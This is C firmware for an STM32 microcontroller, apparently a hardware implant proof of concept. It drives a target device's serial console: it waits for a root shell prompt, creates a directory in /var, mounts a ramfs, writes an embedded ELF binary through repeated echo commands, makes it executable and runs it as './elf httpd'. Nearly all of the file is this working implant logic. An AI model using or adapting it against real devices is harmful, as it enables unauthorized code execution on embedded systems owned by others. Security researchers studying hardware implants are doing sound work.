/* USER CODE BEGIN Header */
/**
  ******************************************************************************
  * @file           : main.c
  * @brief          : Main program body
  ******************************************************************************
  * @attention
  *
  * <h2><center>&copy; Copyright (c) 2019 STMicroelectronics.
  * All rights reserved.</center></h2>
  *
  * This software component is licensed by ST under BSD 3-Clause license,
  * the "License"; You may not use this file except in compliance with the
  * License. You may obtain a copy of the License at:
  *                        opensource.org/licenses/BSD-3-Clause
  *
  ******************************************************************************
  */
/* USER CODE END Header */

/* Includes ------------------------------------------------------------------*/
#include "main.h"

/* Private includes ----------------------------------------------------------*/
/* USER CODE BEGIN Includes */
#include "elf.h"
#include <string.h>
/* USER CODE END Includes */

/* Private typedef -----------------------------------------------------------*/
/* USER CODE BEGIN PTD */

/* USER CODE END PTD */

/* Private define ------------------------------------------------------------*/
/* USER CODE BEGIN PD */
#define RX_BUFF_SIZE 100

#define CMD_SHELL_RX_BUFF_SIZE 8

#define STATE_INITIAL 0
#define STATE_PROMPT_SHELL_DETECTED 1
#define STATE_CWD_TO_VAR 2
#define STATE_POC_RW_DIRECTORY_CREATED 3
#define STATE_IMPLANT_RAMFS_MOUNTED 4
#define STATE_ELF_UPLOADED 5
#define STATE_FAIL 7;
/* USER CODE END PD */

/* Private macro -------------------------------------------------------------*/
/* USER CODE BEGIN PM */

/* USER CODE END PM */

/* Private variables ---------------------------------------------------------*/
UART_HandleTypeDef huart1;
DMA_HandleTypeDef hdma_usart1_rx;
DMA_HandleTypeDef hdma_usart1_tx;

/* USER CODE BEGIN PV */
uint8_t g_rx_buff_size;
uint8_t g_rx_buff[RX_BUFF_SIZE];
char g_buff[RX_BUFF_SIZE];
/* USER CODE END PV */

/* Private function prototypes -----------------------------------------------*/
void SystemClock_Config(void);
static void MX_GPIO_Init(void);
static void MX_DMA_Init(void);
static void MX_USART1_UART_Init(void);
/* USER CODE BEGIN PFP */
void wait_without_lock(uint8_t);
uint8_t search_string_on_global_buffer(uint8_t, char *);
uint8_t is_root_shell_prompt_present();
void transmit_carriage_return_and_newline();
uint8_t set_current_working_directory();
uint8_t create_poc_directory();
uint8_t mount_implant_ramfs();
uint8_t upload_elf();
/* USER CODE END PFP */

/* Private user code ---------------------------------------------------------*/
/* USER CODE BEGIN 0 */

/* USER CODE END 0 */

/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
  /* USER CODE BEGIN 1 */
  uint8_t state = STATE_INITIAL;
  /* USER CODE END 1 */
  

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();

  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();

  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
  MX_DMA_Init();
  MX_USART1_UART_Init();
  /* USER CODE BEGIN 2 */
  // We wait 25 seconds until target finish the boot process.
  for (uint8_t i = 0; i < 25; i++)
  {
    // We use the LED as a visual debugging helper.
    HAL_GPIO_TogglePin(GPIOC, GPIO_PIN_13);
    HAL_Delay(1000);
  }
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while (1)
  {
	    // Check if we have a root shell.
	    if (state == STATE_INITIAL)
	    {
	      if (is_root_shell_prompt_present() == 1)
	      {
	        state = STATE_PROMPT_SHELL_DETECTED;
	        char msg[] = "# Changing state to STATE_PROMPT_SHELL_DETECTED.\r\n";
	        HAL_UART_Transmit(&huart1, (uint8_t *)&msg, sizeof(msg) - 1, 100);
	        HAL_Delay(500);
	        memset(g_rx_buff, 0x00, sizeof(g_rx_buff));
	      }
	      else
	      {
	        // In case we don't get the shell prompt we can transmit a carriage
	        // return and newline to get one.
	        g_rx_buff_size = CMD_SHELL_RX_BUFF_SIZE;
	        HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);
	        transmit_carriage_return_and_newline();
	        HAL_Delay(100);
	      }
	    }
	    else if (state == STATE_PROMPT_SHELL_DETECTED)
	    {
	      if (set_current_working_directory() == 0)
	      {
	        state = STATE_CWD_TO_VAR;
	        char msg[] = "# Changing state to STATE_CWD_TO_VAR.\r\n";
	        HAL_UART_Transmit(&huart1, (uint8_t *)&msg, sizeof(msg) - 1, 100);
	        HAL_Delay(500);
	        memset(g_rx_buff, 0x00, sizeof(g_rx_buff));
	      }
	    }
	    else if (state == STATE_CWD_TO_VAR)
	    {
	      if (create_poc_directory() == 0)
	      {
	        state = STATE_POC_RW_DIRECTORY_CREATED;
	        char msg[] = "# Changing state to STATE_POC_RW_DIRECTORY_CREATED.\r\n";
	        HAL_UART_Transmit(&huart1, (uint8_t *)&msg, sizeof(msg) - 1, 100);
	        HAL_Delay(500);
	        memset(g_rx_buff, 0x00, sizeof(g_rx_buff));
	      }
	    }
	    else if (state == STATE_POC_RW_DIRECTORY_CREATED)
	    {
	        if (mount_implant_ramfs() == 0)
	        {
	          state = STATE_IMPLANT_RAMFS_MOUNTED;
	          char msg[] = "# Changing state to STATE_IMPLANT_RAMFS_MOUNTED.\r\n";
	          HAL_UART_Transmit(&huart1, (uint8_t *)&msg, sizeof(msg) - 1, 100);
	          HAL_Delay(500);
	          memset(g_rx_buff, 0x00, sizeof(g_rx_buff));
	        }
	        else
	        {
	          // In case we fail this state can't fix itself with a retry.
	          state = STATE_FAIL;
	        }
	    }
	    else if (state == STATE_IMPLANT_RAMFS_MOUNTED)
	    {
	      if (upload_elf() == 0)
	      {
	        state = STATE_ELF_UPLOADED;
	        char msg[] = "# Changing state to STATE_ELF_UPLOADED.\r\n";
	        HAL_UART_Transmit(&huart1, (uint8_t *)&msg, sizeof(msg) - 1, 100);
	        HAL_Delay(500);
	        memset(g_rx_buff, 0x00, sizeof(g_rx_buff));
	      }
	      else
	      {
	        // In case we fail this state can't fix itself with a retry.
	        state = STATE_FAIL;
	      }
	    }
	    HAL_GPIO_TogglePin(GPIOC, GPIO_PIN_13);
	    HAL_Delay(100);
    /* USER CODE END WHILE */
    /* USER CODE BEGIN 3 */
  }
  /* USER CODE END 3 */
}

/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};

  /** Initializes the CPU, AHB and APB busses clocks 
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_HSI;
  RCC_OscInitStruct.HSIState = RCC_HSI_ON;
  RCC_OscInitStruct.HSICalibrationValue = RCC_HSICALIBRATION_DEFAULT;
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_NONE;
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
  {
    Error_Handler();
  }
  /** Initializes the CPU, AHB and APB busses clocks 
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_HSI;
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_0) != HAL_OK)
  {
    Error_Handler();
  }
}

/**
  * @brief USART1 Initialization Function
  * @param None
  * @retval None
  */
static void MX_USART1_UART_Init(void)
{

  /* USER CODE BEGIN USART1_Init 0 */

  /* USER CODE END USART1_Init 0 */

  /* USER CODE BEGIN USART1_Init 1 */

  /* USER CODE END USART1_Init 1 */
  huart1.Instance = USART1;
  huart1.Init.BaudRate = 115200;
  huart1.Init.WordLength = UART_WORDLENGTH_8B;
  huart1.Init.StopBits = UART_STOPBITS_1;
  huart1.Init.Parity = UART_PARITY_NONE;
  huart1.Init.Mode = UART_MODE_TX_RX;
  huart1.Init.HwFlowCtl = UART_HWCONTROL_NONE;
  huart1.Init.OverSampling = UART_OVERSAMPLING_16;
  if (HAL_UART_Init(&huart1) != HAL_OK)
  {
    Error_Handler();
  }
  /* USER CODE BEGIN USART1_Init 2 */

  /* USER CODE END USART1_Init 2 */

}

/** 
  * Enable DMA controller clock
  */
static void MX_DMA_Init(void) 
{
  /* DMA controller clock enable */
  __HAL_RCC_DMA1_CLK_ENABLE();

  /* DMA interrupt init */
  /* DMA1_Channel4_IRQn interrupt configuration */
  HAL_NVIC_SetPriority(DMA1_Channel4_IRQn, 0, 0);
  HAL_NVIC_EnableIRQ(DMA1_Channel4_IRQn);
  /* DMA1_Channel5_IRQn interrupt configuration */
  HAL_NVIC_SetPriority(DMA1_Channel5_IRQn, 0, 0);
  HAL_NVIC_EnableIRQ(DMA1_Channel5_IRQn);

}

/**
  * @brief GPIO Initialization Function
  * @param None
  * @retval None
  */
static void MX_GPIO_Init(void)
{

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOA_CLK_ENABLE();

}

/* USER CODE BEGIN 4 */

/*
 * This UART RX Callback function copies g_rx_buff(global UART RX buffer)
 * to g_buff(global buffer).The maximum size is defined in RX_BUFF_SIZE
 * constant.
 */
void HAL_UART_RxCpltCallback(UART_HandleTypeDef *huart)
{
  if (huart->Instance == USART1)
  {
    if (g_rx_buff_size <= (RX_BUFF_SIZE - 1))
    {
      memcpy((void *)g_buff, (void *)g_rx_buff, g_rx_buff_size);
      g_buff[g_rx_buff_size] = 0x00;
    }
  }
}

/*
 * Perform 100 miliseconds HAL_delay to avoid lock and affect the DMA
 * callback function? Not sure about this.
 */
void wait_without_lock(uint8_t seconds)
{
  for(uint8_t i = 0; i < (seconds * 10); i++)
    HAL_Delay(100);
}

/*
 * This function performs several strstr calls on g_buff(global buffer)
 * using the string parameter. Useful to wait for g_buff to sync.
 */
uint8_t search_string_on_global_buffer(uint8_t seconds, char *string)
{
  for(uint8_t i = 0; i < (seconds * 10); i++)
  {
    if (strstr(g_buff, string) != NULL)
      return 1;
    HAL_Delay(100);
  }
  return 0;

}

/*
 * This function verifies if the global buffer contains the command
 * prompt for a root shell.
 */
uint8_t is_root_shell_prompt_present()
{
  // TODO: remove commented code.
  // if (strstr(g_buff, " # ") != NULL);
  //    return 1;
  // return 0;
  return search_string_on_global_buffer(5, " # ");
}

/*
 * This function transmits a carriage return and new line through UART.
 *
 */
void transmit_carriage_return_and_newline()
{
  char msg[] = "\r\n";
  HAL_UART_Transmit(&huart1, (uint8_t *)&msg, sizeof(msg) - 1, 1000);
}

/*
 * This function sets the current working directory. If fails returns 1.
 */
uint8_t set_current_working_directory()
{
  char target_cmd[] = "cd var\r\n";
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd, sizeof(target_cmd) - 1, 1000);
  HAL_Delay(500);
  char verification_cmd[] = "pwd\r\n";
  g_rx_buff_size = 20;
  HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);
  HAL_UART_Transmit(&huart1, (uint8_t *)&verification_cmd, sizeof(verification_cmd) - 1, 1000);
  if (search_string_on_global_buffer(5, "pwd\r\n/var\r\n") == 1)
    return 0;
  return 1;
}

/*
 * This function creates the PoC directory that is going to be use to
 * mount the RAMFS. If fails returns 1.
 */
uint8_t create_poc_directory()
{
  char target_cmd[] = "mkdir PoC\r\n";
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd, sizeof(target_cmd) - 1, 1000);
  HAL_Delay(500);
  char verification_cmd[] = "ls\r\n";
  g_rx_buff_size = 99;
  HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);
  HAL_UART_Transmit(&huart1, (uint8_t *)&verification_cmd, sizeof(verification_cmd) - 1, 1000);
  if (search_string_on_global_buffer(5, "    PoC\r\n") == 1)
    return 0;
  return 1;
}

/*
 * This function mounts a RAMFS where the implant is going to write
 * the ELF executable. If fails returns 1.
 */

uint8_t mount_implant_ramfs()
{
  char target_cmd[] = "mount -t ramfs -o size=1m ramfs PoC\r\n";
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd, sizeof(target_cmd) - 1, 1000);
  HAL_Delay(500);
  // TODO: perform verification.
  char cmd[] = "cd PoC\r\n";
  HAL_UART_Transmit(&huart1, (uint8_t *)&cmd, sizeof(cmd) - 1, 1000);
  HAL_Delay(500);
  return 0;
}

/*
 * This function transmits the elf char array defined in elf.h using the echo command.
 *
 */
uint8_t upload_elf()
{
  uint elf_length = sizeof(elf);
  for (uint idx = 0; idx < elf_length; idx += 8)
  {
    int cnt = 0;
    const char cmd_format[] = "echo \"\\x%02X\\x%02X\\x%02X\\x%02X\\x%02X\\x%02X\\x%02X\\x%02X\\c\" >> elf\r\n";
    char cmd[70] = { 0x00 };
    cnt = snprintf(cmd, sizeof(cmd), cmd_format, elf[idx], elf[idx+1], elf[idx+2], elf[idx+3], elf[idx+4], elf[idx+5], elf[idx+6], elf[idx+7]);
    if (cnt != 50)
      return 1;
    HAL_UART_Transmit(&huart1, (uint8_t *)&cmd, sizeof(cmd) - 1, 1000);
    HAL_Delay(500);
    // Every 10 UART transmissions we wait a second.
    if (idx % 80 == 0)
      HAL_Delay(500);
  }

  char chmod_cmd[] = "chmod +x elf\r\n";
  HAL_UART_Transmit(&huart1, (uint8_t *)&chmod_cmd, sizeof(chmod_cmd) - 1, 1000);
  HAL_Delay(500);

  char exec_cmd[] = "./elf httpd\r\n";
  HAL_UART_Transmit(&huart1, (uint8_t *)&exec_cmd, sizeof(exec_cmd) - 1, 1000);
  HAL_Delay(500);

  return 0;
}
/* USER CODE END 4 */

/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */

  /* USER CODE END Error_Handler_Debug */
}

#ifdef  USE_FULL_ASSERT
/**
  * @brief  Reports the name of the source file and the source line number
  *         where the assert_param error has occurred.
  * @param  file: pointer to the source file name
  * @param  line: assert_param error line source number
  * @retval None
  */
void assert_failed(uint8_t *file, uint32_t line)
{ 
  /* USER CODE BEGIN 6 */
  /* User can add his own implementation to report the file name and line number,
     tex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */
  /* USER CODE END 6 */
}
#endif /* USE_FULL_ASSERT */

/************************ (C) COPYRIGHT STMicroelectronics *****END OF FILE****/
